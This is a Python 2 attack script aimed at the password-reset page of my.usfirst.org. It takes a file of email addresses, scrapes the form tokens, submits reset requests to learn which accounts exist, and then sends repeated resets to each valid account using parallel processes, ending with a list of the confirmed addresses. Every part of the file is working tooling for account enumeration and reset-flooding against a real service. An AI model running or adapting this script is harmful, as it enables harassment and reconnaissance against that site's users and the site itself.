#!/usr/bin/env python

import multiprocessing, itertools
import urllib, requests
from bs4 import BeautifulSoup
from Queue import Queue
from os import SEEK_SET, SEEK_END
from sys import argv

def get_form_input_values(my_cookies):
	print '\x1b[1m\x1b[36m[*] Obtaining valid viewstate, eventtarget, and submit information'
	form_stuff = {'__EVENTTARGET': '', '__EVENTARGUMENT': ''}
	headers = { 'Host': 'my.usfirst.org',
	'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
	'Accept': '*/*'	}
	req = requests.get('https://my.usfirst.org/stims/ResetPassword.aspx', cookies=my_cookies, headers=headers)
	html = req.text
	bs = BeautifulSoup(html)
	for param_id in ('__VIEWSTATE', '__EVENTVALIDATION', 'ContentPlaceholder_btnSubmit'):
		element = bs.find(id=param_id)
		form_stuff[element.attrs['name']] = element.attrs['value']
	return form_stuff

def gimme_new_cookies():
	print '\x1b[1m\x1b[36m[*] Obtaining a session cookie from https://my.usfirst.org/stims/Login.aspx'
	req = requests.get('https://my.usfirst.org/stims/Login.aspx')
	return req.cookies

def check_email(email, out_q):
	print '\x1b[1m\x1b[36m[*] Attempting to reset password for account: '+email
	headers = { 'Host': 'my.usfirst.org',
	'Referer': 'https://my.usfirst.org/stims/ResetPassword.aspx',
	'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
	'Accept': '*/*'	}
	my_cookies = gimme_new_cookies()
	form_stuff=get_form_input_values(my_cookies)
	form_stuff['ctl00$ContentPlaceholder$txtEmail'] = email
	form_stuff['ctl00$ContentPlaceholder$txtConfirmEmail'] = email
	reset_request = requests.post('https://my.usfirst.org/stims/ResetPassword.aspx', data=form_stuff, allow_redirects=False, cookies=my_cookies, headers=headers)
	response_html = reset_request.text
	if 'href="/stims/ResetPasswordComplete.aspx">' in response_html:
		print '\x1b[1m\x1b[32m[+] Successfully reset password for account: '+email
		if out_q:
			out_q.put(email)
		return True
	return False

def check_email_multiple_times(email, n_times, out_q):
	print '\x1b[1m\x1b[36m[*] Validating: ' + email
	if check_email(email, out_q):
		print '\x1b[1m\x1b[32m[+] %s is a valid email, sending %d reset requests' % (email, n_times)
		for i in xrange(n_times-1):
			check_email(email, None)
	else:
		print '\x1b[1m\x1b[33m[-] %s i not a valid email' % email

def star_check_email_multiple_times(email_n_ntimes_out_q):
	check_email_multiple_times(*email_n_ntimes_out_q)

def iter_file_lines(file_name):
	with open(file_name, 'r') as f:
		f.seek(0, SEEK_END)
		file_len = f.tell()
		f.seek(0, SEEK_SET)
		while f.tell() != file_len:
			yield f.readline()[:-1]

def wrapper(func):
	def wrap(self, timeout=None):
		return func(self, timeout=timeout if timeout is not None else 1e100)
	return wrap

def main(args):
	__import__('multiprocessing.pool').pool.IMapIterator.next = wrapper
	if len(args) != 4:
		print '\x1b[1m\x1b[31m[!] Usage: %s [input emails file] [number of times to reset each account] [number of concurrent processes]' % args[0]
		return 1
	num_check_per_email = int(args[2])
	email_file = args[1]
	num_procs = int(args[3])
	out_q = multiprocessing.Manager().Queue()
	emails_iterator = iter_file_lines(email_file)
	process_pool = multiprocessing.Pool(num_procs)
	process_pool.imap(star_check_email_multiple_times, itertools.izip( emails_iterator, itertools.repeat(num_check_per_email), itertools.repeat(out_q) ) )
	process_pool.close()
	process_pool.join()
	if not out_q.empty() != 0:
		print '\x1b[1m\x1b[32m[+] Valid accounts reset:'
		while not out_q.empty():
			print '\t\x1b[1m\x1b[32m[+] '+out_q.get()
	else:
		print '\x1b[1m\x1b[33m[-] No valid accounts found'
if __name__ == '__main__':
	try:
		exit(main(argv))
	except KeyboardInterrupt:
		exit(0)
